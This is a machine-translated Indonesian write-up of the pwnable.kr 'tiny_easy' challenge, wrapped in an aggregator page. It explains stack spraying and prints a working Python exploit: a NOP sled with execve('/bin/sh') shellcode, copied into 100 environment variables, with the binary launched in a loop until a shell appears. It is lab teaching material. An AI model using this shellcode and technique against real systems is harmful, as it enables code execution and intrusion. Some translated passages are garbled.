<!doctype html>
<html class="no-js" lang="id">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🀄️ 🎲 🐄 Pemecahan masalah dengan pwnable.kr 27 - tiny_easy. Memahami Stack Spraying 🐢 🚄 👨🏼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pada artikel ini, kita akan menyelesaikan tugas ke-27 dari situs pwnable.kr dan kita akan mengerti apa itu Stack spraying.
 
 Informasi Organisasi , -...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Pemecahan masalah dengan pwnable.kr 27 - tiny_easy. Memahami Stack Spraying</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/487620/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="gambar"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada artikel ini, kita akan menyelesaikan tugas ke-27 dari situs </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pwnable.kr</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dan kita akan mengerti apa itu Stack spraying.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informasi Organisasi</font></font></b><div class="spoiler_text">  ,    -           ,        :<br>
<br>
<ul>
<li>PWN;</li>
<li> (Crypto);</li>
<li>c  (Network);</li>
<li> (Reverse Engineering);</li>
<li> (Stegano);</li>
<li>   WEB-.</li>
</ul><br>
         ,    ,        ,     .<br>
<a name="habracut"></a><br>
      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">    </a>.<br>
<br>
      .          ,  -      ,      .<br>
</div></div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Solusi untuk pekerjaan tiny_easy</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Klik pada ikon tanda tangan tyni_easy. Kami diberi alamat dan port untuk terhubung melalui ssh. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/q-/yl/dz/q-yldzq42gi-ljkee84njvphs04.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami terhubung melalui SSH dan kami melihat bendera dan program sudah tanpa kode sumber. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bj/er/jh/bjerjh8h3vd73sozoxr3wxlljsa.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sebagai hasil dari memeriksa file, kami menemukan bahwa itu tidak memiliki perlindungan. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/q1/yg/wz/q1ygwzjjb352ef6petoktqa9r-c.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Unduh program ke disassembler. File ini sangat kecil dan hanya mengikuti beberapa instruksi. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/nf/7l/xs/nf7lxsmitan7fwcykpz9z8bzqlu.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada awalnya, program mengekstraksi nilai dari tumpukan ke register EAX, setelah itu mengekstrak nilai yang lain ke EDX dan mentransfer kontrol ke alamat ini. Tapi apa yang ada di tumpukan di awal program? Tumpukan pada saat itu berisi argc yang sama (jumlah argumen program), argv (pointer ke array argumen program) dan envp (pointer ke array variabel lingkungan).</font></font><br>
<br>
<img src="https://habrastorage.org/webt/6q/xq/5f/6qxq5ff-fdfnlbchy7td30dybyo.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jadi, di EDX, alamat akan ditempatkan pada elemen pertama dari array argumen program, yaitu, di jalur penuh ke file yang dapat dieksekusi! Karena itu, ketika mencoba menjalankannya sebagai kode, aplikasi tersebut harus macet. Jika Anda memeriksa, maka ternyata. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/3r/_z/kx/3r_zkxdcvrq8pv4yilpp6ijjpiu.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Stack spraying adalah serangan yang menggunakan kesalahan dalam memori aplikasi, yang memaksa aplikasi untuk mengalokasikan memori untuk sejumlah besar objek yang mengandung kode berbahaya. Ini meningkatkan kemungkinan keberhasilan eksploit, yang mentransfer aliran eksekusi ke beberapa posisi di dalam. Penting untuk dipahami bahwa tanpa eksploit yang memungkinkan Anda mengubah alur eksekusi, serangan ini tidak akan membahayakan. Serangan didasarkan pada prediksi alamat dalam ruang alamat proses.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saat membuat proses dalam sistem operasi, ruang alamat dialokasikan untuk kebutuhannya, di mana data pengguna, kode yang dapat dieksekusi, dan beberapa informasi sistem, yang tergantung pada sistem operasi tertentu, berada. Jadi, di segmen tumpukan, variabel dengan kelas penempatan otomatis disimpan, serta informasi yang disimpan setiap kali fungsi dipanggil, misalnya, variabel statis dan alamat pengirim saat fungsi dipanggil. Dalam kasus penyemprotan tumpukan, kami beroperasi pada variabel lingkungan tempat eksploitasi berada. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan cara ini kita dapat mengatur shellcode di variabel lingkungan di stack. Tapi kami akan melakukan banyak operasi nop di depannya, karena kami tidak mungkin bisa sampai ke alamat yang benar.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> subprocess<font></font>
<font></font>
payload =  <span class="hljs-string">"\x90"</span>*<span class="hljs-number">4096</span> + <span class="hljs-string">"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Karena program dimulai dari alamat 0xff ******, kami mengambil alamat acak untuk stack dari lingkungan ini, misalnya, 0xffbbbbbbbb.</font></font><br>
<pre><code class="python hljs">addr = <span class="hljs-string">"\xb0\xaf\xb5\xff"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang kita akan membuat beberapa variabel lingkungan dengan shellcode kita, sehingga kemungkinan untuk mendapatkannya lebih tinggi.</font></font><br>
<br>
<pre><code class="python hljs">envs = {}
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>):  <font></font>
    envs[<span class="hljs-string">"env"</span>+str(i)] = payload</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan beberapa kali kami menjalankan program dengan parameter kami.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<font></font>
	p = subprocess.Popen([addr], executable=<span class="hljs-string">"/home/tiny_easy/tiny_easy"</span>, env=envs)<font></font>
	p.wait()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setelah menjalankan kode lengkap, kami mendapatkan shell. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mf/pz/i7/mfpzi7o2iplbidzmwy9aqttkxmq.png" alt="gambar"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Selanjutnya ... Anda dapat bergabung dengan kami di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Mari kita mengumpulkan komunitas di mana akan ada orang-orang yang berpengalaman dalam banyak bidang TI, maka kita selalu dapat saling membantu dalam masalah TI dan keamanan informasi.</font></font></div>
      
    </div><p class="reference-to-source js-reference-to-source">Source: https://habr.com/ru/post/undefined/</p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id487604/index.html">Sematkan catatan singkat programmer: duplikasi bagian dalam memori mikrokontroler</a></li>
<li><a href="../id487606/index.html">Visualisasi garis-garis ketegangan dan gerakan muatan elektrostatik, simulasi gerakan planet tata surya</a></li>
<li><a href="../id487610/index.html">RealWorld: aiohttp, Tortoise ORM</a></li>
<li><a href="../id487612/index.html">Menambahkan, menghapus, dan mengganti nama file serta tujuan dengan mudah dalam proyek-proyek CMake</a></li>
<li><a href="../id487616/index.html">Membuat item khusus menggunakan tabel contoh di C # untuk Windows Form</a></li>
<li><a href="../id487622/index.html">Antipatterns untuk bekerja dengan database</a></li>
<li><a href="../id487626/index.html">Cara kerja sensor parkir dan cara menipunya</a></li>
<li><a href="../id487628/index.html">Diagnosis penuaan berdasarkan 9 tanda tanda penuaan</a></li>
<li><a href="../id487630/index.html">Algoritma Sederhana untuk Membuat Puzzle Lapangan (Bagian 1)</a></li>
<li><a href="../id487632/index.html">“Kolega, bernapas lebih tenang”: mengapa kebisingan kantor membuat kita gila - kita membahas penelitian</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>